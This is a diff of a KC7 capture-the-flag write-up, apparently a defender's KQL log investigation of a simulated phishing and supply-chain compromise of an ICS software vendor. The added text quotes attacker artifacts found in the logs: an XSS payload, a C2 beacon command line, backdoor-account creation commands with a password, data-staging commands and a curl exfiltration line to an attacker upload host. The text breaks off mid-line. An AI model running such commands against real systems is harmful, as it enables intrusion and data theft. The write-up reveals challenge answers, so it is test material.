@@ -18,19 +18,22 @@ A supply chain security investigation involving Industrial Control Systems (ICS)
 | **Category** | ICS Security / Supply Chain Attack |
 | **Difficulty** | Medium |
 | **Platform** | KC7 |
-| **Points** | [FILL IN] |
+| **Investigation Tool** | Azure Data Explorer (ADX) with KQL |
+| **Target Organization** | Solvi Systems |
+| **Industry Focus** | Power and utility companies in Southern Africa |
 
 ---
 
 ## Scenario
 
-This challenge investigates a supply chain compromise affecting Industrial Control Systems (ICS) infrastructure. The scenario involves analyzing how adversaries leveraged third-party vendor relationships to gain unauthorized access to critical industrial systems, following the MITRE ATT&CK for ICS framework.
+Solvi Systems provides DOCKS software used by power and utility companies across South Africa, Mozambique, Eswatini, Zimbabwe, and Namibia. This challenge investigates a sophisticated supply chain compromise affecting their Industrial Control Systems (ICS) infrastructure. The scenario involves analyzing how adversaries leveraged third-party vendor relationships and phishing campaigns to gain unauthorized access to critical industrial systems, culminating in data exfiltration of sensitive ICS documentation.
 
 **Investigation Objectives:**
-- Identify compromised supply chain components
+- Identify compromised supply chain components and attack infrastructure
 - Trace lateral movement into ICS networks
 - Determine impact on operational technology (OT) systems
 - Document indicators of compromise (IOCs)
+- Reconstruct the complete attack timeline
 
 ---
 
@@ -38,182 +41,403 @@ This challenge investigates a supply chain compromise affecting Industrial Contr
 
 ### 1. Initial Reconnaissance
 
-[FILL IN: Initial steps taken to understand the scope of the supply chain compromise]
+The investigation begins with understanding the organizational structure and baseline data.
 
-```bash
-# Example initial enumeration commands
-[FILL IN]
-```
+```kql
+# Enumerate employee database
+Employees
+| count
+# Result: 500 employees
 
-### 2. Supply Chain Analysis
-
-Investigation of the third-party vendor infrastructure and trust relationships.
-
-```bash
-# Identify vendor connections and trust boundaries
-[FILL IN]
+# Identify key personnel
+Employees
+| where role == "CTO"
+# Result: Alexis Khoza (CTO)
 ```
 
 **Key Findings:**
-- [FILL IN: Compromised vendor components]
-- [FILL IN: Attack vector details]
-- [FILL IN: Initial access method]
+- Total organization size: 500 employees
+- Critical personnel identified: Alexis Khoza (CTO)
+- Multiple roles targeted, including DOCKS-related positions
 
-### 3. ICS Network Enumeration
+### 2. Web Reconnaissance and Initial Attack Attempts
 
-Mapping the industrial control system environment and identifying affected components.
+Adversaries conducted extensive reconnaissance using a consistent user agent string.
 
+```kql
+# Identify reconnaissance traffic
+InboundNetworkEvents
+| where user_agent contains "Opera"
+| where timestamp between (datetime("2024-05-03") .. datetime("2024-05-05"))
+| count
+# Result: 64 total reconnaissance records
+```
+
+**Attack Timeline:**
+- **First contact:** 2024-05-01T00:00:00Z
+- **Main attack date:** 2024-05-03
+- **XSS attempt timestamp:** 2024-05-03T14:48:08Z
+
+**Reconnaissance Details:**
+- 64 browsing records targeting solvisystems[.]com
+- Specific interest in DOCKS ICS product
+- 9 malicious web requests attempted (all unsuccessful - 404 responses)
+
+```kql
+# XSS attack attempt
+InboundNetworkEvents
+| where url contains "alert"
+```
+
+**Failed Attack Examples:**
+- XSS payload: `https://www.solvisystems.com/feedback?message=</script><script>alert('xss')</script>`
+- Status code: 404 (unsuccessful)
+- JavaScript command attempted: `alert('xss')`
+
+**Adversary Infrastructure:**
+
+| IP Address | Activity |
+|-----------|----------|
+| 13.201[.]46[.]208 | XSS attempts, reconnaissance |
+| 98.117[.]26[.]236 | C2 server, reconnaissance |
+| 105.78[.]23[.]64 | Reconnaissance |
+| 56.6[.]30[.]190 | Reconnaissance |
+
+**User Agent:**
+```
+Opera/8.64.(X11; Linux x86_64; kok-IN) Presto/2.9.165 Version/10.00
+```
+
+### 3. Supply Chain Analysis - Phishing Infrastructure
+
+Investigation of the third-party vendor infrastructure revealed a coordinated phishing campaign.
+
+```kql
+# Identify malicious domains
+PassiveDns
+| where ip has_any ("98.117.26.236", "56.6.30.190", "105.78.23.64", "13.201.46.208")
+| distinct domain
+```
+
+**Malicious Domains Identified:**
+- eco-awareness-update[.]net
+- energy-trends4u[.]net
+- news-on-industry[.]com
+
+**Domain Resolution:**
+```kql
+# Example: bit.ly resolution during investigation
+PassiveDns
+| where domain == "bit.ly"
+| distinct ip
+```
+
+**Phishing Campaign Analysis:**
+
+```kql
+# Enumerate phishing emails
+Email
+| where link has_any ("eco-awareness-update.net", "energy-trends4u.net", "news-on-industry.com")
+   or sender has_any ("eco-awareness-update.net", "energy-trends4u.net", "news-on-industry.com")
+| count
+# Result: 56 phishing emails
+```
+
+**Phishing Infrastructure:**
+- Total emails sent: 56
+- Distinct senders: 3
+  - news[@]eco-awareness-updates[.]net
+  - energy_industry_news[@]protonmail[.]com
+  - electric_updates[@]gmail[.]com
+- Distinct filenames in links: 3
+- Email subject pattern: `[EXTERNAL] Business Opportunity: Two major energy companies merging`
+
+**Targeted Roles:**
+1. Sales Representative
+2. Customer Support Specialist (27 employees targeted)
+3. DOCKS ICS Security Lead
+4. Project Manager for DOCKS ICS
+5. DOCKS Customer Success Manager
+
+### 4. Initial Compromise - Carla Wharton
+
+The first successful compromise occurred through a targeted spear-phishing email.
+
+```kql
+# First phishing email
+Email
+| where link has_any ("eco-awareness-update.net", "energy-trends4u.net", "news-on-industry.com")
+| take 1
+```
+
+**Victim Profile:**
+- **Name:** Carla Wharton
+- **Email:** carla_wharton[@]solvisystems[.]com
+- **Hostname:** JUSP-LAPTOP
+- **IP Address:** 10.10.0.164
+- **Username:** cawharton
+
+**Phishing Email Details:**
+- **Timestamp:** 2024-05-01T15:51:41Z
+- **Sender:** news[@]eco-awareness-updates[.]net
+- **Reply-to:** electric_updates[@]gmail[.]com
+- **Subject:** [EXTERNAL] Business Opportunity: Two major energy companies merging
+- **Malicious Link:** `http://news-on-industry.com/search/online/files/public/Energy_Industry_Trends_2024_4_Solvi.docx`
+- **Verdict:** CLEAN (bypassed email security)
+
+**User Interaction:**
+- Link clicked at: 2024-05-01T15:57:41Z (6 minutes after receipt)
+
+```kql
+# Confirm network access
+OutboundNetworkEvents
+| where url contains "news-on-industry.com"
+| where src_ip contains "10.10.0.164"
+```
+
+### 5. Malware Deployment and Execution
+
+```kql
+# File creation events
+FileCreationEvents
+| where hostname == "JUSP-LAPTOP"
+| where timestamp > datetime(2024-05-01T15:57:41Z)
+| take 2
+```
+
+**Malware Deployment Timeline:**
+
+| Time | File | Process | Hash |
+|------|------|---------|------|
+| 2024-05-01 15:58:29 | Energy_Industry_Trends_2024_4_Solvi.docx | firefox[.]exe | eb7126f65e8a0a8ae4c74b94cdd7ae89ebb6te61caa6578c3229208cc205dcd2 |
+| 2024-05-01 15:59:25 | **ecobug[.]exe** | explorer[.]exe | **1c3ef0407d571403750c52f7abfa86c081fd7a021b52e2abe8a669f92413252** |
+
+**Malware Details:**
+- **Filename:** ecobug[.]exe
+- **Path:** C:\ProgramData\ecobug[.]exe
+- **SHA256:** 1c3ef0407d571403750c52f7abfa86c081fd7a021b52e2abe8a669f92413252
+- **Distribution:** 39 Solvi Systems computers compromised
+
+```kql
+# Count infected systems
+FileCreationEvents
+| where filename contains "ecobug"
+| count
+# Result: 39 systems
+```
+
+### 6. Command and Control (C2) Communication
+
+```kql
+# Identify C2 commands
+ProcessEvents
+| where process_commandline contains "ecobug.exe"
+```
+
+**C2 Configuration:**
 ```bash
-# ICS protocol analysis
-[FILL IN]
+ecobug.exe --timeout 6000 --dest 98.117.26.236 --port 1337
 ```
 
-**Critical Assets Identified:**
-- [FILL IN: PLCs, RTUs, HMIs, or other ICS devices]
-- [FILL IN: Industrial protocols in use]
-- [FILL IN: Network segmentation details]
+**C2 Infrastructure:**
+- **Server:** 98.117[.]26[.]236
+- **Port:** 1337 (TCP)
+- **Protocol:** Custom beacon
 
-### 4. Lateral Movement Tracking
+**Network Flow Analysis:**
 
-Analyzing how the attacker moved from IT infrastructure into OT networks.
-
-```python
-# Example log analysis script
-[FILL IN]
+```kql
+# Analyze persistent connections
+NetworkFlow
+| where dest_ip contains "98.117.26.236" and src_ip contains "10.10.0.164"
+| count
+# Result: 24 connections from Carla's machine
 ```
 
-**MITRE ATT&CK for ICS Techniques Observed:**
-- [FILL IN: T0XXX - Technique name]
-- [FILL IN: T0XXX - Technique name]
-- [FILL IN: T0XXX - Technique name]
+**C2 Pattern:**
+- Connection frequency: Daily at 17:38:25 UTC
+- Total compromised hosts communicating with C2: 38 distinct source IPs
+- Total connections: 470
 
-### 5. Impact Assessment
+### 7. Discovery and Enumeration
 
-Determining the operational impact on industrial processes.
+Post-exploitation discovery commands executed on compromised systems.
 
+```kql
+# Discovery commands on Carla's machine
+ProcessEvents
+| where process_commandline contains "net"
+| where username contains "cawharton"
+| where hostname == "JUSP-LAPTOP"
+```
+
+**Discovery Commands Timeline:**
+
+| Timestamp | Command | Purpose |
+|-----------|---------|---------|
+| 2024-05-02 15:20:49 | `netstat -an` | Network enumeration |
+| 2024-05-02 15:53:49 | `net view` | Network share discovery |
+| 2024-05-02 17:28:49 | `net share` | Share enumeration |
+| 2024-05-02 17:54:49 | `net use` | Last discovery command |
+
+### 8. Persistence and Privilege Escalation
+
+```kql
+# Identify user creation
+ProcessEvents
+| where process_commandline contains "gu@rd!an"
+| take 1
+```
+
+**Backdoor Account Creation:**
+- **Username:** gu@rd!an
+- **Password:** abc1toothree
+- **Creation time:** 2024-05-02T16:25:20Z
+- **Hostname:** MQQY-MACHINE
+- **Created by:** makertzman
+
+**Privilege Escalation:**
+```cmd
+net users /add gu@rd!an abc1toothree
+net localgroup administrators gu@rd!an /add
+```
+
+**Persistence Mechanism:**
+```kql
+# Identify persistence command
+ProcessEvents
+| where process_commandline == "net use /PERSISTENT:YES"
+| distinct hostname
+```
+
+**Systems with Persistence:**
+1. SJ9V-MACHINE
+2. UPLM-DESKTOP
+3. JP4D-MACHINE
+
+**First persistence timestamp:** 2024-05-27T16:23:10Z
+
+### 9. Lateral Movement into ICS Infrastructure
+
+The adversary pivoted to target DOCKS-related employees and systems.
+
+**Key Target Identified:**
+- **Name:** Alexei Petrov
+- **Role:** DOCKS Customer Success Manager
+- **Hostname:** SJ9V-MACHINE
+- **IP Address:** 10.10.0.3
+- **Email:** alexei_petrov[@]solvisystems[.]com
+- **Username:** alpetrov
+
+**Internal Reconnaissance:**
+
+```kql
+# Identify internal portal access
+InboundNetworkEvents
+| where url contains "process"
+```
+
+**Accessed Documentation:**
+- **URL:** `https://devportal.solvisystems.com/development_lifecycle/internal_process.pdf`
+- **Access timestamps:** 2024-05-27 10:46:48, 2024-05-29 10:13:18, 2024-05-29 14:45:08
+- **Source IPs:** 56.6[.]30[.]190, 13.201[.]46[.]208
+
+**Social Engineering Campaign:**
+
+```kql
+# Compromised account phishing
+Email
+| where sender contains "alex"
+| where subject contains "document"
+```
+
+**Internal Phishing Details:**
+- **Sender (compromised):** alexei_petrov[@]solvisystems[.]com
+- **Subject:** "🤔 ¡Urgent Request: DOCKS System Documentation 🚨"
+- **Targets:** Other DOCKS-related personnel
+- **Purpose:** Locate sensitive DOCKS ICS documentation
+
+**Recipients:**
+- bernadette_callahan[@]solvisystems[.]com
+- sibongile_sithole[@]solvisystems[.]com
+- michael_potts[@]solvisystems[.]com
+- marcia_biron[@]solvisystems[.]com
+- lerato_naidoo[@]solvisystems[.]com
+
+### 10. Data Collection and Staging
+
+```kql
+# File collection commands
+ProcessEvents
+| where hostname == "SJ9V-MACHINE"
+| where process_commandline contains "copy"
+```
+
+**Collection Commands:**
+
+```powershell
+# Stage 1: Data Collection
+Copy-Item -Path \\solvisystems.com\SharedDocs\SoftwareDevelopment\CycleDocuments\* -Destination C:\Users\alpetrov\CollectedData\Software_Cycle_Docs
+
+# Stage 2: Compression
+Compress-Archive -Path C:\Users\alpetrov\CollectedData\* -DestinationPath C:\DataExfil\CollectedData.zip
+```
+
+**Collection Timeline:**
+- **Data copy:** 2024-05-27 17:09:58 and 17:11:58
+- **Compression:** 2024-05-27 17:52:50
+- **Archive name:** CollectedData[.]zip
+
+**Network Paths Accessed:**
+- `\\solvisystems.com\SharedDocs\SoftwareDevelopment\CycleDocuments\`
+
+### 11. Data Exfiltration
+
+```kql
+# Exfiltration events
+ProcessEvents
+| where process_commandline contains "collecteddata.zip"
+```
+
+**Exfiltration Command:**
 ```bash
-# Assess system modifications or control changes
-[FILL IN]
+curl -F 'file=@C:\DataExfil\CollectedData.zip' https://api.eco-awareness-update.net/upload
 ```
 
-**Compromise Indicators:**
-- [FILL IN: Unauthorized configuration changes]
-- [FILL IN: Abnormal process behavior]
-- [FILL IN: Safety system impacts]
+**Exfiltration Details:**
 
-### 6. Flag Capture
+| Account | Hostname | Timestamp | File |
+|---------|----------|-----------|------|
+| alpetrov | SJ9V-MACHINE | 2024-05-28 11:23:14 | CollectedData[.]zip |
+| jalee | UPLM-DESKTOP | 2024-05-29 10:22:59 | CollectedData[.]zip |
+| tagreen | JP4D-MACHINE | 2024-05-29 16:20:39 | CollectedData[.]zip |
 
-[FILL IN: Final steps to retrieve the flag]
+**Exfiltration Summary:**
+- **Total compromised accounts used:** 3
+- **Exfiltration destination:** api.eco-awareness-update[.]net/upload
+- **Method:** HTTP POST via curl
+- **Data type:** Sensitive DOCKS ICS software development documentation
 
-```bash
-# Flag retrieval
-[FILL IN]
+### 12. Flag Capture
+
+The investigation successfully reconstructed the complete attack chain from initial reconnaissance through data exfiltration, identifying all compromised systems and accounts.
+
+**Key Evidence:**
+```kql
+# Complete attack reconstruction
+let AttackTimeline = 
+    InboundNetworkEvents
+    | where user_agent contains "Opera"
+    | union (Email | where link has_any ("eco-awareness-update.net", "energy-trends4u.net", "news-on-industry.com"))
+    | union (FileCreationEvents | where filename == "ecobug.exe")
+    | union (ProcessEvents | where process_commandline contains "gu@rd!an")
+    | union (NetworkFlow | where dest_ip == "98.117.26.236")
+    | project timestamp, EventType, Details;
 ```
-
-**Flag:** `[FILL IN]`
 
 ---
 
 ## Tools Used
 
-- **[FILL IN]** - Network traffic analysis
-- **[FILL IN]** - ICS protocol decoder
-- **[FILL IN]** - Log analysis and correlation
-- **[FILL IN]** - SCADA/ICS enumeration tool
-- **Wireshark** - Packet capture analysis (if applicable)
-- **nmap** with NSE scripts - ICS service detection (if applicable)
-
----
-
-## Technical Analysis
-
-### Supply Chain Attack Vector
-
-The compromise followed a classic supply chain attack pattern:
-
-1. **Initial Compromise:** [FILL IN: How the vendor was compromised]
-2. **Trust Exploitation:** [FILL IN: How trust relationships were abused]
-3. **Persistence Mechanism:** [FILL IN: How access was maintained]
-4. **ICS Infiltration:** [FILL IN: How OT networks were accessed]
-
-### Network Architecture
-
-```
-[FILL IN: Network diagram or description showing:]
-- IT/OT boundary
-- Compromised vendor systems
-- Affected ICS components
-- Attack path
-```
-
-### Indicators of Compromise (IOCs)
-
-**Network Indicators:**
-- [FILL IN: Malicious IP addresses]
-- [FILL IN: Suspicious domains]
-- [FILL IN: Anomalous network traffic patterns]
-
-**File Indicators:**
-- [FILL IN: Malicious file hashes]
-- [FILL IN: Modified configuration files]
-
-**Behavioral Indicators:**
-- [FILL IN: Unusual process execution]
-- [FILL IN: Abnormal authentication patterns]
-
----
-
-## Defensive Recommendations
-
-Based on this investigation, the following security controls should be implemented:
-
-### Supply Chain Security
-1. **Vendor Risk Management:** Implement third-party security assessments and continuous monitoring
-2. **Trust Boundaries:** Enforce strict network segmentation between vendor access and critical ICS zones
-3. **Multi-Factor Authentication:** Require MFA for all vendor remote access
-
-### ICS-Specific Controls
-1. **Network Segmentation:** Deploy defense-in-depth architecture separating IT and OT networks
-2. **Protocol Monitoring:** Implement ICS protocol anomaly detection (Modbus, DNP3, etc.)
-3. **Asset Inventory:** Maintain comprehensive inventory of all ICS devices and firmware versions
-4. **Change Management:** Enforce strict change control for ICS configurations
-
-### Detection and Response
-1. **Behavioral Analytics:** Monitor for anomalous ICS commands and process deviations
-2. **Log Aggregation:** Centralize logs from IT, OT, and vendor access points
-3. **Incident Response:** Develop ICS-specific incident response procedures
-
----
-
-## References
-
-- [MITRE ATT&CK for ICS](https://attack.mitre.org/matrices/ics/)
-- [NIST SP 800-82 Rev. 3: Guide to Operational Technology (OT) Security](https://csrc.nist.gov/publications/detail/sp/800-82/rev-3/final)
-- [ICS-CERT Recommended Practices](https://www.cisa.gov/uscert/ics/recommended-practices)
-- [CISA Supply Chain Risk Management Guidelines](https://www.cisa.gov/supply-chain)
-
----
-
-## Key Takeaways
-
-1. **Supply Chain as Attack Surface:** Third-party vendors with privileged access represent significant risk to critical infrastructure, requiring robust vendor risk management programs.
-
-2. **IT/OT Convergence Risks:** The blending of information technology and operational technology networks creates new attack paths that must be carefully managed through segmentation and monitoring.
-
-3. **ICS Protocol Awareness:** Understanding industrial protocols (Modbus, DNP3, OPC, etc.) is essential for detecting anomalous behavior in OT environments.
-
-4. **Defense in Depth for ICS:** Multiple layers of security controls are necessary, including network segmentation, protocol whitelisting, and anomaly detection specific to industrial processes.
-
-5. **Trust Verification:** "Trust but verify" is insufficient for ICS environments—continuous validation of vendor access and activities is critical for operational security.
-
-6. **Incident Response Planning:** ICS incidents require specialized response procedures that balance cybersecurity with safety and operational continuity considerations.
-
----
-
-**Author's Note:** This challenge effectively demonstrates the complexities of securing industrial control systems against supply chain attacks, highlighting the importance of understanding both cybersecurity principles and operational technology architectures.
-
----
-
-*Challenge Author: David Brown*  
-*Writeup Date: [FILL IN]*  
-*Contact: [FILL IN]*
+- **Azure Data Explorer (ADX)** - Primary investigation platform
+- **K
